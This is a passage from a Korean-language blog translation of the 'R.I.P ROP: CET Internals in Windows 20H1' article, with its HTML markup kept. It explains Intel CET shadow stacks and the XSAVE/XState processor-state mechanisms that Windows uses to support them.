&#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p> &#xC6D0;&#xBB38; &#xAE00; : <a href="https://windows-internals.com/cet-on-windows/">R.I.P ROP: CET Internals in Windows 20H1</a> </p></blockquote><h2 id="&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;"><a href="#&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;" class="headerlink" title="&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;"></a>&#xB4E4;&#xC5B4;&#xAC00;&#xBA70;</h2><p>&#xCD5C;&#xADFC; Windows 10&#xC758; 19H1(Version 1903) &#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC5D0; &#xB9E4;&#xC6B0; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC77C;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;. &#xC778;&#xD154; <a href="https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf">CET(Control-flow Enforcement Technology)</a> &#xAD6C;&#xD604;&#xC774; &#xC218;&#xB144;&#xAC04;&#xC758; &#xB17C;&#xC758; &#xB05D;&#xC5D0; &#xC2DC;&#xC791;&#xB41C; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; CET &#xC801;&#xC6A9;&#xC740; &#xBAA8;&#xB4E0; &#xBC84;&#xC804;&#xC758; Windows &#xB9B4;&#xB9AC;&#xC988;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC791;&#xB144;(2020) &#xB9B4;&#xB9AC;&#xC2A4;&#xC778; 20H1 (&#xBC84;&#xC804; 2004)&#xC740; Intel Tiger Lake CPU&#xC5D0;&#xC11C; &#xB9B4;&#xB9AC;&#xC988; &#xB420; CET&#xC758; user mode shadow stack &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC6D0;&#xC744; &#xC644;&#xB8CC;&#xD588;&#xB2E4;.</p><p>&#xC778;&#xD154; CET&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC720;&#xD615;&#xC758; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBB34;&#xACB0;&#xC131; &#xC704;&#xBC18;&#xC778; forward-edge &#xC704;&#xBC18; (indirect CALL &#xBC0F; JMP)&#xACFC; backward-edge &#xC704;&#xBC18; (RET)&#xC744; &#xD574;&#xACB0;&#xD558;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAE30;&#xBC18; mitigation&#xC774;&#xB2E4;.</p><p>forward-edge &#xAD6C;&#xD604;&#xC740; &#xC0C8;&#xB86D;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; (&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Microsoft&#xC758; <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a>&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xD615;&#xD0DC;&#xC758; <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">clang-cfi</a>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xB2E4;.) backward-edge &#xAD6C;&#xD604;&#xC740; ISA&#xC758; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xBCC0;&#xD654;&#xC5D0; &#xC758;&#xC874;&#xD55C;&#xB2E4;. Shadow Stack &#xC740; CALL &#xBA85;&#xB839;&#xC5B4;&#xC5D0; &#xC758;&#xD574; &#xC2A4;&#xD0DD;&#xC5D0; &#xD478;&#xC2DC;&#xB41C; &#xBC18;&#xD658; &#xC8FC;&#xC18C;&#xB97C; &#xBCF5;&#xC81C;&#xD558;&#xBA70;, RET &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; &#xC2DC; &#xC2A4;&#xD0DD; &#xBC0F; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; &#xAC12;&#xC744; &#xBAA8;&#xB450; &#xD655;&#xC778;&#xD558;&#xACE0; &#xBD88;&#xC77C;&#xCE58; &#xC2DC; INT #21 (&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBCF4;&#xD638; &#xC624;&#xB958;)&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</p><p>&#xC6B4;&#xC601; &#xCCB4;&#xC81C; &#xBC0F; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; CALL&#xACFC; RET &#xC774;&#xC678;&#xC758; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xC2DC;&#xD000;&#xC2A4;(&#xC608; : &#xC608;&#xC678; &#xD574;&#xC81C; &#xBC0F; <a href="https://en.cppreference.com/w/cpp/utility/program/longjmp">longjmp</a>)&#xB97C; &#xC9C0;&#xC6D0;&#xD574;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2DC;&#xC2A4;&#xD15C; &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; &#xB3D9;&#xC791;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB3C4;&#xB85D; <code>Shadow Stack Pointer(SSP)</code> &#xB97C; &#xC870;&#xC791;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xC774; &#xC870;&#xC791; &#xC790;&#xCCB4;&#xAC00; &#xC7A0;&#xC7AC;&#xC801;&#xC778; &#xC6B0;&#xD68C;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xAC80;&#xC99D;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0;&#xC11C;&#xB294; Windows&#xAC00; &#xC774;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><p>Windows&#xAC00; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; shadow stack&#xC744; &#xC870;&#xC791;&#xD558;&#xACE0; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; &#xB450; &#xAC00;&#xC9C0;&#xB97C; &#xC774;&#xD574;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8;&#xB294; SSP&#xC758; &#xC2E4;&#xC81C; &#xC704;&#xCE58; &#xBC0F; &#xAD8C;&#xD55C;&#xC774;&#xACE0; &#xB450; &#xBC88;&#xC9F8;&#xB294; SSP&#xC2A4;&#xB808;&#xB4DC; &#xAC04; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xC804;&#xD658; &#xC2DC; &#xC800;&#xC7A5;/&#xBCF5;&#xC6D0;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xACFC; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xC6B0; (&#xC608; : &#xC608;&#xC678; &#xD574;&#xC81C; &#xC911;)  SSP &#xC218;&#xC815;&#xC774; &#xC218;&#xD589;&#xB418;&#xB294; &#xBC29;&#xBC95;&#xC774;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC124;&#xBA85;&#xD558;&#xB824;&#xBA74; <a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">AVX(Advanced Vector eXtensions)</a> &#xBA85;&#xB839;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD574; Intel&#xC5D0;&#xC11C; &#xB3C4;&#xC785;&#xD558;&#xACE0; Windows 7&#xBD80;&#xD130; Microsoft&#xAC00; &#xC9C0;&#xC6D0;&#xD55C; Intel CPU &#xAE30;&#xB2A5;&#xC744; &#xC54C;&#xC544;&#xBD10;&#xC57C; &#xD55C;&#xB2E4;. &#xB610;&#xD55C; &#xC774; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAE30;&#xC874; CONTEXT&#xAD6C;&#xC870;&#xB97C; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; CONTEXT_EX&#xAD6C;&#xC870;&#xB85C; &#xC7AC;&#xAD6C;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; native API&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xC774;&#xC57C;&#xAE30;&#xD574;&#xC57C; &#xD55C;&#xB2E4;!</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; Windows&#xC758; CET &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xB2E4;&#xB8E8;&#xAE30; &#xC704;&#xD574; &#xC77C;&#xBD80; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xBC0F; PE &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC758; &#xB0B4;&#xBD80;&#xC640; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC815;&#xBCF4; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC0B4;&#xD3B4;&#xBD10;&#xC57C; &#xD55C;&#xB2E4;. &#xC774; &#xAE00;&#xC758; &#xBAA9;&#xCC28;&#xAC00; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD55C; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC744; &#xD0D0;&#xC0C9;&#xD558;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC774;&#xB418;&#xAE30;&#xB97C; &#xBC14;&#xB780;&#xB2E4;. &#xB610;&#xD55C; <a href="https://github.com/yardenshafir/cet-research">&#xAD00;&#xB828; GitHub &#xC800;&#xC7A5;&#xC18C;</a>&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xC0C8;&#xB85C; &#xB3C4;&#xC785;&#xB41C; &#xB2E4;&#xC591;&#xD55C; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC8FC;&#xC11D;&#xC774; &#xB2EC;&#xB9B0; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="XState-&#xB0B4;&#xBD80;"><a href="#XState-&#xB0B4;&#xBD80;" class="headerlink" title="XState &#xB0B4;&#xBD80;"></a>XState &#xB0B4;&#xBD80;</h1><p>x86-x64 &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xD074;&#xB798;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xB294; &#xBC94;&#xC6A9; &#xB808;&#xC9C0;&#xC2A4;&#xD130;(RAX, RCX), &#xC81C;&#xC5B4; &#xB808;&#xC9C0;&#xC2A4;&#xD130; (RIP, RSP&#x2026;), &#xBD80;&#xB3D9; &#xC18C;&#xC218;&#xC810; &#xB808;&#xC9C0;&#xC2A4;&#xD130; (XMM, YMM, ZMM)&#xC640; &#xC77C;&#xBD80; &#xC81C;&#xC5B4;, &#xB514;&#xBC84;&#xADF8; &#xBC0F; &#xD14C;&#xC2A4;&#xD2B8; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xB4F1; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC790;&#xB4E4;&#xC5D0;&#xAC8C; &#xC775;&#xC219;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC138;&#xD2B8;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB354; &#xB9CE;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xAE30;&#xB2A5;&#xC774; &#xCD94;&#xAC00;&#xB428;&#xC5D0; &#xB530;&#xB77C; &#xC0C8; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC0F; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD2B9;&#xC815; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC;&#xB97C; &#xC815;&#xC758;&#xD574;&#xC57C; &#xD588;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5; &#xC911; &#xB9CE;&#xC740; &#xBD80;&#xBD84;&#xC774; &#xC2A4;&#xB808;&#xB4DC; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xC804;&#xD658; &#xC911;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xBCF5;&#xC6D0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD574;&#xACB0;&#xCC45;&#xC73C;&#xB85C; &#xC778;&#xD154;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC;&#xB97C; <code>&#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;</code>&#xC758; &#xBE44;&#xD2B8;&#xC640; &#xC5F0;&#xACB0;&#xD558;&#xACE0; <code>XSAVE</code> &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xC694;&#xCCAD;&#xB41C; &#xC0C1;&#xD0DC;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xAE30; &#xC704;&#xD55C; <code>XSAVE</code> &#xBC0F; <code>XRSTOR</code>&#xC640; &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xB3C4;&#xC785;&#xD558;&#xB294; <code>XState(eXtended State)</code> <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developers-manual.pdf">&#xD45C;&#xC900;</a>&#xC744; &#xC815;&#xC758;&#xD588;&#xB2E4;. &#xC774; &#xC601;&#xC5ED;&#xC740; &#xAC01; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; CET &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC800;&#xC7A5;&#xC18C;&#xC758; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xC774;&#xC9C0;&#xB9CC; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC0AC;&#xB78C;&#xB4E4;&#xC740; &#xAE30;&#xC874; &#xBD80;&#xB3D9; &#xC18C;&#xC218;&#xC810;, AVX &#xBC0F; <a href="https://software.intel.com/en-us/articles/introduction-to-intel-memory-protection-extensions">&#xBA54;&#xBAA8;&#xB9AC; &#xBCF4;&#xD638; &#xD655;&#xC7A5;(Memory Protection eXtensions, MPX)</a> &#xAE30;&#xB2A5;&#xC5D0; &#xCD08;&#xC810;&#xC744; &#xB450;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; XSAVE &#xC9C0;&#xC6D0;&#xC744; &#xB300;&#xBD80;&#xBD84; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#xC788;&#xB2E4;. &#xAE30;&#xB2A5; &#xBC0F; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC5D0; &#xB300;&#xD55C; &#xAC1C;&#xC694;&#xB294; &#xB3C5;&#xC790;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xAC83;&#xC774;&#xB2E4;.</p><h2 id="XSAVE-&#xC601;&#xC5ED;"><a href="#XSAVE-&#xC601;&#xC5ED;" class="headerlink" title="XSAVE &#xC601;&#xC5ED;"></a>XSAVE &#xC601;&#xC5ED;</h2><p>&#xC55E;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; XSAVE &#xC601;&#xC5ED;&#xC740; &#xC6D0;&#xB798; Intel&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0; &#xCD94;&#xAC00; &#xD55C; AVX&#xC640; &#xAC19;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xBD80;&#xB3D9; &#xC18C;&#xC218;&#xC810; &#xAE30;&#xB2A5; &#xC911; &#xC77C;&#xBD80;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC774;&#xC804;&#xC5D0; <code>FXSTOR</code> &#xBC0F; <code>FXRSTR</code> &#xBA85;&#xB839;&#xC744; &#xD1B5;&#xD574; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAE30;&#xC874; x86 FPU &#xBC0F; SSE &#xC0C1;&#xD0DC;&#xB97C; &#xD1B5;&#xD569;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xB2E4;. &#xC774; &#xCC98;&#xC74C; &#xB450; &#xAC1C;&#xC758; &#xB808;&#xAC70;&#xC2DC; &#xC0C1;&#xD0DC;&#xB294; <code>&#xB808;&#xAC70;&#xC2DC; XSAVE &#xC601;&#xC5ED;</code>&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xCD94;&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; (&#xC608; : AVX)&#xB294; <code>&#xD655;&#xC7A5;&#xB41C; XSAVE &#xC601;&#xC5ED;</code>&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB2E4;. &#xADF8; &#xC0AC;&#xC774;&#xC5D0; <code>XSAVE &#xC601;&#xC5ED; &#xD5E4;&#xB354;</code> &#xB294; <code>XSTATE_BV</code>&#xB77C;&#xB294; &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xD1B5;&#xD574; &#xC5B4;&#xB5A4; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xC124;&#xBA85;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><p>&#xB3D9;&#xC2DC;&#xC5D0; XSAVE &#xAE30;&#xB2A5;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xB97C; &#xC815;&#xC758;&#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; <code>XCR0(eXtended Control Register)</code>&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC73C;&#xBA70; XCR0&#xC744; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; <code>XGETBV</code> &#xBC0F; <code>XSETBV</code> &#xBA85;&#xB839;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB2E4;. (&#xC774;&#xD6C4;&#xC5D0; &#xCD94;&#xAC00;&#xB420; <code>XCR</code>&#xB3C4; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xC774;&#xB2E4;.) &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xB294; x87 FPU &#xBC0F; SSE&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xB2A5; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D;, &#xC989; &#xB808;&#xAC70;&#xC2DC; <code>FXSTOR</code> &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xD655;&#xC7A5;&#xB41C; &#xAE30;&#xB2A5;&#xC758; &#xC0C1;&#xD0DC;&#xB9CC; XSAVE &#xC601;&#xC5ED;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB3C4;&#xB85D; XCR0&#xC744; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D;&#xD574; &#xC120;&#xD0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><code>PKRU(Protection Key Register User State)</code>&#xB97C; &#xCD94;&#xAC00;&#xD55C;  <a href="https://www.kernel.org/doc/html/latest/core-api/protection-keys.html">MPK(Memory Protection Key)</a>&#xC640; &#xAC19;&#xC740; &#xACE0;&#xAE09; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC138;&#xD2B8; &#xBC0F; &#xAE30;&#xB2A5;&#xC758; &#xC218;&#xAC00; &#xC99D;&#xAC00;&#xD568;&#xC5D0; &#xB530;&#xB77C; &#xCD5C;&#xC2E0; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xB294; <code>XSAVES</code> &#xBC0F; <code>XRSRTORS</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; CPL0 &#xCF54;&#xB4DC;&#xB85C;&#xB9CC; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xC288;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xC0C1;&#xD0DC;&#xC640; &#xC555;&#xCD95; &#xBC0F; &#xCD5C;&#xC801;&#xD654; &#xBC84;&#xC804; (<code>XSAVEC</code> / <code>XSAVEOPT</code>)&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xD574; &#xC778;&#xD154;&#xB9CC;&#xC758; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xB2E4;. &#xC288;&#xD37C;&#xBC14;&#xC774;&#xC800; &#xC804;&#xC6A9; &#xC0C1;&#xD0DC;&#xB97C; &#xC815;&#xC758;&#xD558;&#xAE30; &#xC704;&#xD574; <code>IA32_XSS</code>&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; <code>MSR(Model Specific Register)</code>&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/1.png" alt></p><blockquote><p>optimized XSAVE &#xC601;&#xC5ED; vs not optimized XSAVE &#xC601;&#xC5ED;<br>(VX &#xBC0F; CET_U&#xAC00; &#xB178;&#xD2B8; &#xD65C;&#xC131;&#xD654;&#xB418;&#xACE0; IPT &#xBC0F; PKRU&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xB9C8;&#xC9C0;&#xB9C9; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xC804;&#xD658; &#xC774;&#xD6C4;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC2A4;&#xB808;&#xB4DC;)</p></blockquote><p><code>Optimized XSAVE</code> &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xB9C8;&#xC9C0;&#xB9C9; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xC2A4;&#xC704;&#xCE58; (&#xC788;&#xB294; &#xACBD;&#xC6B0;) &#xC774;&#xD6C4; &#xB2E4;&#xB978; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xC758;&#xD574; &#xC2E4;&#xC81C;&#xB85C; &#xC218;&#xC815;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC;&#xB9CC; XSAVE&#xC601;&#xC5ED;&#xC5D0; &#xAE30;&#xB85D;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC8FC;&#xBA70; &#xB0B4;&#xBD80; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; <code>XINUSE</code>&#xC774; &#xC815;&#xBCF4;&#xB97C; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC900;&#xB2E4;. <code>XSAVEOPT</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; <code>XSTATE_BV</code> &#xB9C8;&#xC2A4;&#xD06C;&#xB294; &#xC694;&#xCCAD;&#xB41C; &#xBAA8;&#xB4E0; &#xC0C1;&#xD0DC;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xC2E4;&#xC81C;&#xB85C; &#xC800;&#xC7A5;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBE44;&#xD2B8;&#xB9CC; &#xD3EC;&#xD568;&#xB41C;&#xB2E4;.</p><p>&#xBC18;&#xBA74; <code>Compacted XSAVE</code> &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xAE30;&#xC874; XState &#xB514;&#xC790;&#xC778;&#xC758; &#xACB0;&#xD568;&#xC744; &#xC218;&#xC815;&#xD588;&#xB2E4;. <code>AVX512</code> &#xBC0F; <a href="https://software.intel.com/content/www/us/en/develop/blogs/processor-tracing.html">IPT(Intel Processor Trace)</a>&#xC640; &#xAC19;&#xC740; &#xB354; &#xB9CE;&#xC740; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC774; &#xCD94;&#xAC00;&#xB428;&#xC5D0; &#xB530;&#xB77C; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD070; XSAVE&#xC601;&#xC5ED;&#xC744; &#xD560;&#xB2F9;&#xD558;&#xACE0; 0&#xC73C;&#xB85C; &#xAE30;&#xB85D;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. <code>Optimized XSAVE</code>&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xB0AD;&#xBE44;&#xB97C; &#xD53C;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xD655;&#xC7A5; &#xAE30;&#xB2A5;&#xC740; &#xAE30;&#xBCF8; XSAVE &#xC601;&#xC5ED; &#xBC84;&#xD37C;&#xB85C;&#xBD80;&#xD130; &#xD070; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC788;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD55C;&#xB2E4;.</p><p><code>XSAVEC</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD604;&#xC7AC; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xC758;&#xD574; &#xC2E4;&#xC81C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C; XState &#xAE30;&#xB2A5;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xACF5;&#xAC04;&#xB9CC; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC800;&#xC7A5;&#xB41C; &#xAC01; &#xC0C1;&#xD0DC;&#xB97C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xBC30;&#xCE58;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xB2E4;. (CPUID&#xB97C; &#xD1B5;&#xD574; <code>&#xC815;&#xB82C; &#xB9C8;&#xC2A4;&#xD06C;</code>&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC81C;&#xACF5;&#xB418;&#xB294; &#xACE0;&#xC815; 64-byte &#xC815;&#xB82C;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;.)</p><p>&#xC774;&#xC804;&#xC5D0; &#xD45C;&#xC2DC;&#xB41C; XSAVE &#xC601;&#xC5ED; &#xD5E4;&#xB354;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xC778; <code>XCOMP_BV</code>&#xB85C; &#xD655;&#xC7A5;&#xB418;&#xC5B4; 